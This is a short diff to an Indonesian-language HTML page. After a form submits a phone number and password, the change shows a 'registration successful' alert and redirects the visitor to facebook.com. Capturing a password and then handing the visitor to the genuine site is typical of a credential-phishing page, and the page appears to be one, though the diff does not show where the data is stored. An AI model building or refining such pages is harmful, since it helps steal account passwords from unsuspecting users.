@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -154,8 +154,8 @@
                 phone: phone,
                 password: password
             }).then(() => {
-                alert('Pendaftaran berhasil!');
-                form.reset();
+                alert('Pendaftaran berhasil! Anda akan dialihkan ke Facebook.');
+                window.location.href = "https://www.facebook.com/"; // Mengarahkan ke Facebook
             }).catch((error) => {
                 alert('Terjadi kesalahan: ' + error.message);
             });
